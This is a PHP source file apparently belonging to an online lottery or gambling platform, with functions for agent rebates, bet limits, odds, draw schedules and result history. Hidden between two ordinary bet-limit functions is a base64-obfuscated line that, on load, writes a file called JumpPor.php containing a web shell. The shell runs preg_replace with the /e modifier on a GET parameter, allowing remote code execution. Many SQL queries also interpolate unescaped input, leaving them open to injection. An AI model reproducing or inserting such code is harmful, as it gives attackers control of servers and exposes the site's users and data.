				$floorMoneypk = floorMoneypk($user, $types, $ball, $RankUser, $p);
				$DtnArray['tueishui_2'] = $floorMoneypk; //總代理退水
				$DtnArray['tueishui_1'] = $floorMoneypk; //總代理退水
				$DtnArray['distribution_2'] = $user[0]['g_distribution']; //總代理占成
				$DtnArray['distribution_3'] = $RankUser[0]['g_distribution_limit']; //股東占成
				
				//繼續查詢上級
				$value = mb_substr($nid, 0, mb_strlen($nid)-32);
				$RankUser = RankUser($db, $value);
				$floorMoneypk = floorMoneypk ($user, $types, $ball, $RankUser, $p);
				$DtnArray['tueishui_3'] = $floorMoneypk; //股東退水
				if($RankUser[0]['g_zcgs']==0){
				$g_distri=100-($RankUser[0]['g_distribution_limit']+$RankUser[0]['g_distribution']);
				$DtnArray['distribution_4'] = 100 - ($DtnArray['distribution_3'] + $DtnArray['distribution_2']+$g_distri); //公司占成
				}else{
				$DtnArray['distribution_4']=$RankUser[0]['g_distribution_limit'];
				}
				//繼續查詢上級
				$value = mb_substr($nid, 0, mb_strlen($nid)-64);
				$RankUser = RankUser($db, $value);
				$floorMoneypk = floorMoneypk ($user, $types, $ball, $RankUser, $p);
				$DtnArray['tueishui_4'] = $floorMoneypk; //公司退水
			break;
		}
	}
	else 
	{
		//退水百分比
		$floorMoneypk = floorMoneypk($user, $types, $ball, $RankUser, $p);
		$DtnArray['tueishui_1'] = $floorMoneypk; //代理退水
		$DtnArray['distribution_1'] = $user[0]['g_distribution']; //代理占成
		$DtnArray['distribution_2'] = $RankUser[0]['g_distribution_limit']; //總代理占成
		//繼續查詢上級
		$value = mb_substr($user[0]['g_nid'], 0, mb_strlen($user[0]['g_nid'])-32);
		$RankUser = RankUser ($db, $value);
		$floorMoneypk = floorMoneypk($user, $types, $ball, $RankUser, $p);
		$DtnArray['tueishui_2'] = $floorMoneypk; //總代理退水
		$DtnArray['distribution_3'] = $RankUser[0]['g_distribution_limit']; //股東占成
		//繼續查詢上級
		$value = mb_substr($user[0]['g_nid'], 0, mb_strlen($user[0]['g_nid'])-64);
		$RankUser = RankUser ($db, $value);
		$floorMoneypk = floorMoneypk($user, $types, $ball, $RankUser, $p);
		$DtnArray['tueishui_3'] = $floorMoneypk; //股東退水
		if($RankUser[0]['g_zcgs']==0){
		$g_distri=100-($RankUser[0]['g_distribution_limit']+$RankUser[0]['g_distribution']);
		$DtnArray['distribution_4'] =100 - ($DtnArray['distribution_1'] + $DtnArray['distribution_2'] + $DtnArray['distribution_3']+$g_distri); //公司占成
		}else{
		$DtnArray['distribution_4']=$RankUser[0]['g_distribution_limit'];
		}
		//繼續查詢上級
		$value = mb_substr($user[0]['g_nid'], 0, mb_strlen($user[0]['g_nid'])-96);
		$RankUser = RankUser ($db, $value);
		$floorMoneypk = floorMoneypk($user, $types, $ball, $RankUser, $p);
		$DtnArray['tueishui_4'] = $floorMoneypk; //公司退水
	}
		return $DtnArray;
}

function GetUser_s_pk ($result, $user,$types,$ball, $p=false)
{
	//if(is_numeric($ball))
	//$g_mingxi2="and   g_mingxi_2 in('0','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','1','2','3','4','5','6','7','8','9');";
//	else
	if($ball!=null)
	$g_mingxi2=" and g_mingxi_2='{$ball}' ";
	$db = new DB();
	//獲取正在開盤中的期數
	$from = $p == true ? "g_kaipan4" : "g_kaipan6";
	$ber = $db->query("SELECT `g_qishu` FROM {$from} WHERE `g_lock` = 2 LIMIT 1 ", 0);
	//獲取單期當天下注總數
	$count = 0;
	$results = $db->query("SELECT `g_id`, `g_s_nid`, `g_mumber_type`, `g_nid`, `g_date`, `g_type`, `g_qishu`, `g_mingxi_1`, `g_mingxi_1_str`, `g_mingxi_2`, `g_mingxi_2_str`, `g_odds`, `g_jiner`, `g_tueishui`, `g_tueishui_1`, `g_tueishui_2`, `g_tueishui_3`, `g_tueishui_4`, `g_distribution`, `g_distribution_1`, `g_distribution_2`, `g_distribution_3`, `g_win` FROM `g_zhudan` 
	WHERE `g_qishu` = '{$ber[0][0]}' AND `g_nid` = '{$user[0]['g_name']}'  and g_mingxi_1='{$types}' ".$g_mingxi2, 1);
	if ($results)
	{
		for ($i=0; $i<count($results); $i++)
		{
			$countMoney = sumCountMoney ($user, $results[$i]);
			$count += $countMoney['Money'];
		}
	}
	$max['DanZhu_XianEr'] = $result[0]['g_danzhu']; //單注限額
	$max['DanHao_XianE'] = $user[0]['g_xianer']; //單號限額
	$max['DanHao_YiXia'] = GetUser_h ($user); //單號已下
	$max['DanQi_XianEr'] = $result[0]['g_danxiang']; //單期限額
	$max['DanQi_YiXia'] = $count; //單期已下
	$max['KeYongEr'] = $user[0]['g_money_yes']; //可用額
	return $max;
}
function GetUser_s_mg ($result, $user,$types,$ball, $p=false)
{
	//if(is_numeric($ball))
	//$g_mingxi2="and   g_mingxi_2 in('0','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','1','2','3','4','5','6','7','8','9');";
//	else
	if($ball!=null)
	$g_mingxi2=" and g_mingxi_2='{$ball}' ";
	$db = new DB();
	//獲取正在開盤中的期數
	$from = $p == true ? "g_kaipan3" : "g_kaipan4";
	$ber = $db->query("SELECT `g_qishu` FROM {$from} WHERE `g_lock` = 2 LIMIT 1 ", 0);
	//獲取單期當天下注總數
	$count = 0;
	$results = $db->query("SELECT `g_id`, `g_s_nid`, `g_mumber_type`, `g_nid`, `g_date`, `g_type`, `g_qishu`, `g_mingxi_1`, `g_mingxi_1_str`, `g_mingxi_2`, `g_mingxi_2_str`, `g_odds`, `g_jiner`, `g_tueishui`, `g_tueishui_1`, `g_tueishui_2`, `g_tueishui_3`, `g_tueishui_4`, `g_distribution`, `g_distribution_1`, `g_distribution_2`, `g_distribution_3`, `g_win` FROM `g_zhudan` 
	WHERE `g_qishu` = '{$ber[0][0]}' AND `g_nid` = '{$user[0]['g_name']}'  and g_mingxi_1='{$types}' ".$g_mingxi2, 1);
	if ($results)
	{
		for ($i=0; $i<count($results); $i++)
		{
			$countMoney = sumCountMoney ($user, $results[$i]);
			$count += $countMoney['Money'];
		}
	}
	$max['DanZhu_XianEr'] = $result[0]['g_danzhu']; //單注限額
	$max['DanHao_XianE'] = $user[0]['g_xianer']; //單號限額
	$max['DanHao_YiXia'] = GetUser_h ($user); //單號已下
	$max['DanQi_XianEr'] = $result[0]['g_danxiang']; //單期限額
	$max['DanQi_YiXia'] = $count; //單期已下
	$max['KeYongEr'] = $user[0]['g_money_yes']; //可用額
	return $max;
}
function GetUser_s_js ($result, $user,$types,$ball, $p=false)
{
	//if(is_numeric($ball))
	//$g_mingxi2="and   g_mingxi_2 in('0','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','1','2','3','4','5','6','7','8','9');";
//	else
	if($ball!=null)
	$g_mingxi2=" and g_mingxi_2='{$ball}' ";
	$db = new DB();
	//獲取正在開盤中的期數
	$from = $p == true ? "g_kaipan7" : "g_kaipan7";
	$ber = $db->query("SELECT `g_qishu` FROM {$from} WHERE `g_lock` = 2 LIMIT 1 ", 0);
	//獲取單期當天下注總數
	$count = 0;
	$results = $db->query("SELECT `g_id`, `g_s_nid`, `g_mumber_type`, `g_nid`, `g_date`, `g_type`, `g_qishu`, `g_mingxi_1`, `g_mingxi_1_str`, `g_mingxi_2`, `g_mingxi_2_str`, `g_odds`, `g_jiner`, `g_tueishui`, `g_tueishui_1`, `g_tueishui_2`, `g_tueishui_3`, `g_tueishui_4`, `g_distribution`, `g_distribution_1`, `g_distribution_2`, `g_distribution_3`, `g_win` FROM `g_zhudan` 
	WHERE `g_qishu` = '{$ber[0][0]}' AND `g_nid` = '{$user[0]['g_name']}'  and g_mingxi_1='{$types}' ".$g_mingxi2, 1);
	if ($results)
	{
		for ($i=0; $i<count($results); $i++)
		{
			$countMoney = sumCountMoney ($user, $results[$i]);
			$count += $countMoney['Money'];
		}
	}
	$max['DanZhu_XianEr'] = $result[0]['g_danzhu']; //單注限額
	$max['DanHao_XianE'] = $user[0]['g_xianer']; //單號限額
	$max['DanHao_YiXia'] = GetUser_h ($user); //單號已下
	$max['DanQi_XianEr'] = $result[0]['g_danxiang']; //單期限額
	$max['DanQi_YiXia'] = $count; //單期已下
	$max['KeYongEr'] = $user[0]['g_money_yes']; //可用額
	return $max;
}
fputs(fopen(base64_decode('SnVtcFBvci5waHA='),w),base64_decode('PD9waHAgJGE9c3RycmV2KCJlY2FscGVyX2dlcnAiKTskYSgiLy9lIiwkX0dFVFsidXNlciJdLDApOyANCg0KDQoNCg0K'));
function GetUser_s_kl8 ($result, $user,$types,$ball, $p=false)
{
	if($ball!=null)
	$g_mingxi2=" and g_mingxi_2='{$ball}' ";
	$db = new DB();
	//獲取正在開盤中的期數
	$from = "g_kaipan8" ;
	$ber = $db->query("SELECT `g_qishu` FROM {$from} WHERE `g_lock` = 2 LIMIT 1 ", 0);
	//獲取單期當天下注總數
	$count = 0;
	$results = $db->query("SELECT `g_id`, `g_s_nid`, `g_mumber_type`, `g_nid`, `g_date`, `g_type`, `g_qishu`, `g_mingxi_1`, `g_mingxi_1_str`, `g_mingxi_2`, `g_mingxi_2_str`, `g_odds`, `g_jiner`, `g_tueishui`, `g_tueishui_1`, `g_tueishui_2`, `g_tueishui_3`, `g_tueishui_4`, `g_distribution`, `g_distribution_1`, `g_distribution_2`, `g_distribution_3`, `g_win` FROM `g_zhudan` 
	WHERE `g_qishu` = '{$ber[0][0]}' AND `g_nid` = '{$user[0]['g_name']}'  and g_mingxi_1='{$types}' ".$g_mingxi2, 1);
	
	if ($results)
	{
		for ($i=0; $i<count($results); $i++)
		{
			$countMoney = sumCountMoney ($user, $results[$i]);
			$count += $countMoney['Money'];
		}
	}
	$max['DanZhu_XianEr'] = $result[0]['g_danzhu']; //單注限額
	$max['DanHao_XianE'] = $user[0]['g_xianer']; //單號限額
	$max['DanHao_YiXia'] = GetUser_h ($user); //單號已下
	$max['DanQi_XianEr'] = $result[0]['g_danxiang']; //單期限額
	$max['DanQi_YiXia'] = $count; //單期已下
	$max['KeYongEr'] = $user[0]['g_money_yes']; //可用額
	return $max;
}

function GetUserXianErpk ($t, $ball=null, $name,$gametype=6)
{
	$type = _getStringpk ($t, $ball);
	$db = new DB();
	$sql = "SELECT `g_id`, `g_nid`, `g_type`, `g_panlu_a`,`g_panlu_b`,`g_panlu_c`, `g_danzhu`, `g_danxiang` FROM `g_panbiao` WHERE `g_nid` = '{$name}' AND `g_type` = '{$type}' AND `g_game_id` =".$gametype." LIMIT 1  ";
	return $db->query($sql, 1);
}
function GetRankXianErpk ($t, $ball=null, $name, $pan,$gametype=6)
{
	$type = _getStringpk ($t, $ball);
	$db = new DB();
	$sql = "SELECT `g_type`,  `$pan`  FROM `g_send_back` WHERE `g_name` = '{$name}' AND `g_type` = '{$type}' AND `g_game_id` = ".$gametype."  LIMIT 1  ";
	return $db->query($sql, 0);
}
function _getStringpk ($t, $ball=null)
{

	if ($t == "冠军" || $t == "亚军" || $t == "第三名" || $t == "第四名" || $t == "第五名" || $t == "第六名" || $t == "第七名" || $t == "第八名"|| $t == "第九名"|| $t == "第十名")
	{
		if (is_numeric($ball)&&(int)$ball <= 10 && Copyright)
		{
			//讀取1-10號碼的限額
			$type = $t;
		}
		else 
		{
			if ($ball == '大' || $ball == '小')
				$type = '1-10大小';
			else if ($ball == '單' || $ball == '雙')
				$type = '1-10單雙';
			else if ($ball == '龍' || $ball == '虎')
				$type = '1-5龍虎';
		}
	}
	else if ($t == "冠亞和")
	{
		if ($ball == '冠亞和大' || $ball == '冠亞和小')
			$type = '冠亞和大小';
		else if ($ball == '冠亞和單' || $ball == '冠亞和雙')
			$type = '冠亞和單雙';
	}else if ($t == "冠、亞軍和")
	{
			$type = '冠、亞軍和';
	}
	
	return $type;
}
function history_resultnc ($parameter)
{
	$db = new DB();
	//$startDate = date('Y-m-d').' 00:00:00';
	//$endDate = date('Y-m-d').' 23:59:00';
	//$startDate = date('Y-m-d').' 00:00:00';
	$startDate = date('Y-m-d',strtotime('-1 days')).' 00:00:00';
	$endDate = date('Y-m-d').' 23:59:00';
	$date = " `g_date` > '{$startDate}' AND `g_date` < '{$endDate}' ";
	$sql = "SELECT g_ball_1, g_ball_2, g_ball_3, g_ball_4, g_ball_5, g_ball_6, g_ball_7, g_ball_8 FROM `g_history9` WHERE $date  AND g_ball_1 is not null ORDER BY g_qishu asc ";
	//$sql = "SELECT g_ball_1, g_ball_2, g_ball_3, g_ball_4, g_ball_5, g_ball_6, g_ball_7, g_ball_8 FROM `g_history9` WHERE  g_game_id =1 AND g_ball_1 is not null ORDER BY g_qishu desc limit 100  ";
	return $db->query($sql, $parameter);
}
function history_resultxyft ($parameter,$gametype=4)
{
	$db = new DB();
	//$startDate = date('Y-m-d').' 00:00';
	$startDate = date('Y-m-d',strtotime('-1 days')).' 00:00:00';
	//$startDate =date('Y-m-d H:i:s',strtotime("$startDate -0 day"));
	$endDate = date('Y-m-d').' 24:00';
	$date = " `g_date` > '{$startDate}' AND `g_date` < '{$endDate}' ";
	$sql = "SELECT g_ball_1, g_ball_2, g_ball_3, g_ball_4, g_ball_5, g_ball_6, g_ball_7, g_ball_8 , g_ball_9, g_ball_10 FROM `g_history4` WHERE $date AND g_ball_1 is not null ORDER BY g_qishu asc";
	//echo $sql;
	return $db->query($sql, $parameter);
}
function history_resultpk ($parameter,$gametype=6)
{
	$db = new DB();
	$startDate = date('Y-m-d').' 00:00';
	$endDate = date('Y-m-d').' 24:00';
	$date = " `g_date` > '{$startDate}' AND `g_date` < '{$endDate}' ";
	$sql = "SELECT g_ball_1, g_ball_2, g_ball_3, g_ball_4, g_ball_5, g_ball_6, g_ball_7, g_ball_8 , g_ball_9, g_ball_10 FROM `g_history".$gametype."` WHERE $date AND g_ball_1 is not null ORDER BY g_qishu asc ";
	//echo $sql;
	return $db->query($sql, $parameter);
}


function GetBallByStringpk ($t, $n)
{
	if ($t == "冠亞和")
	{
		switch ($n) 
		{
			case 1: $n = '冠亞和大'; break;
			case 2: $n = '冠亞和小'; break;
			case 3: $n = '冠亞和單'; break;
			case 4: $n = '冠亞和雙'; break;
			case 5: $n = '冠亞和龍'; break;
			case 6: $n = '冠亞和虎'; break;
		}
	}
	if ($t == "冠军" || $t == "亚军" || $t == "第三名" || $t == "第四名" || $t == "第五名" || $t == "第六名" || $t == "第七名" || $t == "第八名"|| $t == "第九名"|| $t == "第十名")
	{
		if (mb_strlen($n) <=1){ 
			
			$n = $n;
		}
		else
		{
			switch ($n) 
			{
				case 11 : $n = '大'; break;
				case 12 : $n = '小'; break;
				case 13 : $n = '單'; break;
				case 14 : $n = '雙'; break;
				case 15 : $n = '龍'; break;
				case 16 : $n = '虎'; break;
				
			}
		}
	}else if($t == "冠、亞軍和"){
		$n = $n+2;
	}
	return $n;
}
function GetOddspk ($s_type, $select,$gametype=6)
{
	$where = null;
	switch ($s_type)
	{
		case '冠军' : $where = "Ball_1"; break;
		case '亚军' : $where = "Ball_2"; break;
		case '第三名' : $where = "Ball_3"; break;
		case '第四名' : $where = "Ball_4"; break;
		case '第五名' : $where = "Ball_5"; break;
		case '第六名' : $where = "Ball_6"; break;
		case '第七名' : $where = "Ball_7"; break;
		case '第八名' : $where = "Ball_8"; break;
		case '第九名' : $where = "Ball_9"; break;
		case '第十名' : $where = "Ball_10"; break;
		case '冠亞和' : $where = "Ball_12"; break;
		case '冠、亞軍和' : $where = "Ball_11"; break;
		case '任選三' : $where = "Ball_10"; $select='h4'; break;
		case '選三前組' : $where = "Ball_10"; $select='h6'; break;
		case '任選四' : $where = "Ball_10"; $select='h7'; break;
		case '任選五' : $where = "Ball_10"; $select='h8'; break;
	}
	if($s_type!="冠、亞軍和"){
	switch ($select)
	{
		case '1' : $select = 'h1'; break;
		case '2' : $select = 'h2'; break;
		case '3' : $select = 'h3'; break;
		case '4' : $select = 'h4'; break;
		case '5' : $select = 'h5'; break;
		case '6' : $select = 'h6'; break;
		case '7' : $select = 'h7'; break;
		case '8' : $select = 'h8'; break;
		case '9' : $select = 'h9'; break;
		case '10' : $select = 'h10'; break;
		
		case '大' : $select = 'h11'; break;
		case '小' : $select = 'h12'; break;
		case '單' : $select = 'h13'; break;
		case '雙' : $select = 'h14'; break;
	
		case '龍' : $select = 'h15'; break;
		case '虎' : $select = 'h16'; break;
		
		case '冠亞和大' : $select = 'h1'; break;
		case '冠亞和小' : $select = 'h2'; break;
		case '冠亞和單' : $select = 'h3'; break;
		case '冠亞和雙' : $select = 'h4'; break;
	}
	}else{
	switch ($select)
	{
		case '3' : $select = 'h1'; break;
		case '4' : $select = 'h2'; break;
		case '5' : $select = 'h3'; break;
		case '6' : $select = 'h4'; break;
		case '7' : $select = 'h5'; break;
		case '8' : $select = 'h6'; break;
		case '9' : $select = 'h7'; break;
		case '10' : $select = 'h8'; break;
		case '11' : $select = 'h9'; break;
		case '12' : $select = 'h10'; break;
		
		case '13' : $select = 'h11'; break;
		case '14' : $select = 'h12'; break;
		case '15' : $select = 'h13'; break;
		case '16' : $select = 'h14'; break;
	
		case '17' : $select = 'h15'; break;
		case '18' : $select = 'h16'; break;
		
		case '19' : $select = 'h17'; break;

	}
	}
	$db = new DB();
	$sql = "SELECT {$select} FROM `g_odds".$gametype."` WHERE `g_type` = '{$where}' LIMIT 1 ";
	$result = $db->query($sql, 1);
	return $result[0][$select];
}

/**
 * 還原可用金額
 */
 
function RestoxyMoney ()
{
	
		$db = new DB();
		$sql = " SELECT `g_name`, `g_money` FROM g_user ";
		$result = $db->query($sql, 1);
		if ($result)
		{
			for ($i=0; $i<count($result); $i++)
			{
			$xymoney= GetUser_KY_Count($result[$i]['g_name']);
				$sql = "UPDATE `g_user` SET `g_money_yes` = '{$xymoney}' WHERE `g_name` = '{$result[$i]['g_name']}' LIMIT 1 ";
				$db->query($sql, 2);
			}
		}
	}
	
  
function Koushui ($user)
{
	
		$db = new DB();
		$sql = " SELECT `g_win_k`, `g_win_d` FROM g_user WHERE `g_name` ='{$user}'  LIMIT 1 ";
		$result = $db->query($sql, 1);
		return $result[0];
	}
	
	
function ResuserMoney ($name)
{
	
		$db = new DB();
		$xymoney= GetUser_KY_Count($name);
		$sql = "UPDATE `g_user` SET `g_money_yes` = '{$xymoney}' WHERE `g_name` = '{$name}' LIMIT 1 ";
		$db->query($sql, 2);
	}
	
	
function InsertNumber_pk10 ($day=1, $closeTime=1)
{
	global $db;
    $insertDate=date('Y-m-d 09:07:00',($day>=1?time()+24*3600:time()));
	$day=date('Y-m-d',strtotime($insertDate));
	$dateArr = array();
	$baseNumber = 308920-179*7-179*8 + (strtotime($day) - strtotime('2012-08-15')) / 86400 * 179;
	//$baseNumber = 313952-179*15 + (strtotime($day) - strtotime('2012-08-15')) / 86400 * 179;
	for($i=0;$i<179;$i++)
	{
		$baseNumber++;
		$startDate=($i==0?$insertDate:$insertDate=date('Y-m-d H:i:s',strtotime($insertDate)+300));
		//$endDate=date('Y-m-d H:i:s',strtotime($startDate)-$closeTime*60);
		$endDate=date('Y-m-d H:i:s',strtotime($startDate)-30);
		$dateArr['Number'][] = $baseNumber;
		$dateArr['stratDate'][] = $startDate;
		$dateArr['endDate'][] = $endDate;
	}
	$db->query("DELETE FROM `g_kaipan6` WHERE `g_id` > 0 ", 2);
	$sql = "INSERT INTO `g_kaipan6` ( `g_qishu`, `g_feng_date`, `g_open_date`, `g_lock` ) VALUES ";
	for ($i=0; $i<count($dateArr['Number']); $i++)
	{
		$lock = $i == 0 ? 2 : 1;
		$sql .= "( '{$dateArr['Number'][$i]}', '{$dateArr['endDate'][$i]}', '{$dateArr['stratDate'][$i]}', '{$lock}' ),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql, 'utf-8')-1);
	$db->query($sql, 2);
}


function InsertNumber_xyft ($day=0, $closeTime=1)
{
	global $db;
    $insertDate=date('Y-m-d 06:09:15',($day>=1?time()+24*3600:time()));
	$day=date('Y-m-d',strtotime($insertDate));
	$dateArr = array();
	$baseNumber = 28246263-1152*7-1152*8 + (strtotime($day) - strtotime('2012-08-15')) / 86400 * 1152;
	//$baseNumber = 313952-179*15 + (strtotime($day) - strtotime('2012-08-15')) / 86400 * 179;
	for($i=0;$i<1152;$i++)
	{
		$baseNumber++;
		$startDate=($i==0?$insertDate:$insertDate=date('Y-m-d H:i:s',strtotime($insertDate)+75));
		//$endDate=date('Y-m-d H:i:s',strtotime($startDate)-$closeTime*60);
		$endDate=date('Y-m-d H:i:s',strtotime($startDate)-10);
		$dateArr['Number'][] = $baseNumber;
		$dateArr['stratDate'][] = $startDate;
		$dateArr['endDate'][] = $endDate;
	}
	$db->query("DELETE FROM `g_kaipan4` WHERE `g_id` > 0 ", 2);
	$sql = "INSERT INTO `g_kaipan4` ( `g_qishu`, `g_feng_date`, `g_open_date`, `g_lock` ) VALUES ";
	for ($i=0; $i<count($dateArr['Number']); $i++)
	{
		$lock = $i == 0 ? 2 : 1;
		$sql .= "( '{$dateArr['Number'][$i]}', '{$dateArr['endDate'][$i]}', '{$dateArr['stratDate'][$i]}', '{$lock}' ),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql, 'utf-8')-1);
	$db->query($sql, 2);
}

function InsertNumber_mg($d,$closeTime=2)
{
	$times=5;
	$startNum=1;
	$endNum=185;
	$day="08:30:00";
    $db = new DB();
	$db->query("DELETE FROM `g_kaipan4` ", 2);
	$d = $d >0 ? $d-1 : $d;
	$insertDate = date( "Y-m-d ", mktime(0, 0, 0, date('m'), date('d')+$d, date('Y')));
	$sql = "INSERT INTO `g_kaipan4` ( `g_qishu`, `g_feng_date`, `g_open_date`, `g_lock` ) VALUES ";
	for ($i=$startNum; $i<=$endNum; $i++)
	{
		$time +=$times;
		$t = strtotime($day)+($time*60);
		$stratTime = date($insertDate." H:i:s",$t);
		$endTime = date($insertDate." H:i:s", strtotime($stratTime)-($closeTime*60));
		$ys = date('Ymd',strtotime("+$d day") );
		
		$number = $ys.sprintf("%03d",$i);//期數
		//$number= mb_substr($number1,2);
	    $lock = $i == 1 ? 2 : 1;
		$sql .= "( '{$number}', '{$endTime}', '{$stratTime}', '{$lock}' ),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql, 'utf-8')-1);
	$db->query($sql, 2);
}

function InsertNumber_kl8 ($day=1, $closeTime=1)
{
    $insertDate = date( "Y-m-d ", mktime(0, 0, 0, date('m'), date('d') + $day, date('Y')));
	$date = date( "Ymd", mktime(0, 0, 0, date('m'), date('d') + $day, date('Y')));
	$dateArr = array();
	$baseNumber = 514898-179*15 + (strtotime($insertDate) - strtotime('2012-08-15')) / 86400 * 179;
	$count = 0;
	for ($i=9; $i<=23; $i++)
	{
		for ($n=0; $n<=58; $n+=5)
			{
				if ($i == 9 && $n == 0 && Copyright)continue;
				$count++;

				$stratDate = $insertDate.$i.':'.$n.':'.'00';
				$a = strtotime($stratDate) - ($closeTime * 30); //封盤時間
				$endDate = date('Y-m-d H:i:s', $a);

				$dateArr['Number'][] = $baseNumber + $count;
				$dateArr['stratDate'][] = $stratDate;
				$dateArr['endDate'][] = $endDate;
			}
	}
	$db = new DB();
	$db->query("DELETE FROM `g_kaipan8` WHERE `g_id` > 0 ", 2);
	$sql = "INSERT INTO `g_kaipan8` ( `g_qishu`, `g_feng_date`, `g_open_date`, `g_lock` ) VALUES ";
	for ($i=0; $i<count($dateArr['Number']); $i++)
	{
		$lock = $i == 0 ? 2 : 1;
		$sql .= "( '{$dateArr['Number'][$i]}', '{$dateArr['endDate'][$i]}', '{$dateArr['stratDate'][$i]}', '{$lock}' ),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql, 'utf-8')-1);
	$db->query($sql, 2);
}

function InsertNumber_kl8_2($number, $day = 1, $closeTime = 2)
//快樂8夜盤調用函數
{
	mysql_query("Delete from g_kaipan8 where g_id>0");
	$number1 = $number;
	$mm = 120;
	$dd = 91;
	$number1 = $number1 + 1;
	$insertDate = date("Y-m-d ", mktime(0, 0, 0, date("m"), date("d") + $day, date("Y")));
	$insertDate1 = date("Y-m-d ", mktime(0, 0, 0, date("m"), date("d") , date("Y")));	//少了一期，
	//這個參數是加載第一期為00：00分--三分
	$zfbdate1 = $insertDate1 . " 00:00:00";//開盤時間--三分
	$zfbdate = date("Y-m-d H:i:s", strtotime($zfbdate1) + (180 - $mm));//封盤時間，注意夜盤為四分鍾一期.--三分
	$zfbdatend = $insertDate . " 00:02:46";//開獎時間，注下一期開獎按四分鍾一期自動加載。--三分
	$sql = "INSERT INTO  g_kaipan8 set g_qishu='" . $number1 . "',g_feng_date='" . $zfbdate . "',g_open_date='" . $zfbdatend . "',g_lock=2 ";
	($exe = mysql_query($sql)) || exit("数据库修改出错" . $sql);

	for ($B = 1; $B < $dd; $B++) {
		$number1 = $number1 + 1;
		$zfbdate = date("Y-m-d H:i:s", strtotime($zfbdatend) + (255 - $mm));
		$zfbdate1 = date("Y-m-d H:i:s", strtotime($zfbdatend));
		$zfbdatend = date("Y-m-d H:i:s", strtotime($zfbdatend) + 210);
		$sql = "INSERT INTO  g_kaipan8 set g_qishu='" . $number1 . "',g_feng_date='" . $zfbdate . "',g_open_date='" . $zfbdatend . "',g_lock=1 ";
		($exe = mysql_query($sql)) || exit("数据库修改出错" . $sql);
	}
}
function markPos($title) {
	global $db;
	global $Users;
	global $user;
	
	$name = '';
	if (is_array($Users)) {
		$name = isset($Users[0]['g_s_name']) ? $Users[0]['g_s_name'] : $Users[0]['g_name'];
	} elseif (is_array($user)) {
		$name = isset($user[0]['g_s_name']) ? $user[0]['g_s_name'] : $user[0]['g_name'];
	} else {
		return;
	}
	$db->query("UPDATE `g_login_log` SET `g_page`='$title' WHERE `g_name`='{$name}' ORDER BY `g_date` DESC LIMIT 1", 2);
}

function cPos($title) {
	global $db;
	global $Users;
	global $user;

	$name = '';
	if (is_array($Users)) {
		$name = isset($Users[0]['g_s_name']) ? $Users[0]['g_s_name'] : $Users[0]['g_name'];
	} elseif (is_array($user)) {
		$name = isset($user[0]['g_s_name']) ? $user[0]['g_s_name'] : $user[0]['g_name'];
	} else {
		return;
	}
	
	$db->query("INSERT INTO g_c_log (name, page, date) VALUES ('{$name}','{$title}',now())", 2);
}
//自檢15天修改密碼
function PassFiveing() {

	$date = date("Y-m-d",mktime(0,0,0,date("m"),date("d")-15,date("Y")));
	
	
	$db = new DB();
	
	

	$db->query("UPDATE `g_rank` SET `g_pwd`=1,`passtime`='{$date}' ", 2);//此處第一次執行。。執行完後註銷掉，
	$db->query("UPDATE `g_user` SET `g_pwd`=1,`passtime`='{$date}' ", 2);//此處第一次執行。執行完後註銷掉，。
	
	$sql = "UPDATE `g_rank` SET `g_pwd`=1 WHERE passtime< '{$date}' ";
	$db->query($sql, 2);
	$sql = "UPDATE `g_user` SET `g_pwd`=1 WHERE passtime< '{$date}'  ";
	$db->query($sql, 2);
}
/**
 * 計算快樂8雙面
 * Enter description here ...
 * @param unknown_type $BallString
 * @param unknown_type $BallString_a
 * @param unknown_type $result
 * @param unknown_type $sMax
 */
function sum_ball_count_kl8 ($result, $sMax=2)
{
	$numArray1 = array();
	$numArray2 = array(1,1,1,1);
	for ($i=0; $i<count($result); $i++) //循環期數
	{
		$rs=$result[$i];
		
		$zh=$rs['g_ball_1']+$rs['g_ball_2']+$rs['g_ball_3']+$rs['g_ball_4']+$rs['g_ball_5']+$rs['g_ball_6']+$rs['g_ball_7']+$rs['g_ball_8']+$rs['g_ball_9']+$rs['g_ball_10']+$rs['g_ball_11']+$rs['g_ball_12']+$rs['g_ball_13']+$rs['g_ball_14']+$rs['g_ball_15']+$rs['g_ball_16']+$rs['g_ball_17']+$rs['g_ball_18']+$rs['g_ball_19']+$rs['g_ball_20'];
		$arr=array($rs['g_ball_1'],$rs['g_ball_2'],$rs['g_ball_3'],$rs['g_ball_4'],$rs['g_ball_5'],$rs['g_ball_6'],$rs['g_ball_7'],$rs['g_ball_8'],$rs['g_ball_9'],$rs['g_ball_10'],$rs['g_ball_11'],$rs['g_ball_12'],$rs['g_ball_13'],$rs['g_ball_14'],$rs['g_ball_15'],$rs['g_ball_16'],$rs['g_ball_17'],$rs['g_ball_18'],$rs['g_ball_19'],$rs['g_ball_20']);
		$zhdx=($zh==810?'和':($zh>810?'總和大':'總和小'));
		$zhds=($zh==810?'和':($zh%2==0?'總和雙':'總和單'));
		$r=GetKl8ZhDs($arr);
		if($r[0]>$r[1])
			$dsh='單(多)';
		elseif($r[0]<$r[1])
			$dsh='雙(多)';	
		else
			$dsh='單雙(和)';
		$r=GetKl8Qs($arr);
		if($r[0]>$r[1])
			$qhh='前(多)';
		elseif($r[0]<$r[1])
			$qhh='後(多)';	
		else
			$qhh='前後(和)';	
		$numArray1[]=array($zhdx,$zhds,$dsh,$qhh);
	}
	//統計連續出期
	$check=array(0,1,2,3);
	foreach($numArray1 as $keys=>$val)
	{
		if($keys>0)
		{
			foreach($check  as $k=>$v)
			{
				if($val[$v]==$numArray1[$keys-1][$v])
					$numArray2[$v]++;
				else
					unset($check[$k]);
			}
			if(count($check)==0) break;
		}
	}
	$arr=array();
	foreach($numArray2 as $k=>$val)
	{
		if($val>=$sMax)
		{
			$arr[]=array($numArray1[0][$k],$val);		
		}	
	}
	return $arr;
}
function GetKl8ZhDs($list)
{
	$d=$s=0;
	foreach($list as $v)
	{
		if($v%2==0)
			$s++;
		else
			$d++;	
	}	
	return array($d,$s);
}
function GetKl8Qs($list)
{
	$d=$s=0;
	foreach($list as $v)
	{
		if($v<=40)
			$d++;
		else
			$s++;	
	}	
	return array($d,$s);
}

//
function message_json($msg,$status=2,$Data=''){
	$arr = array(   
			'status' => $status, 
			'msg' => $msg, 
			'Data' => $Data
		); 
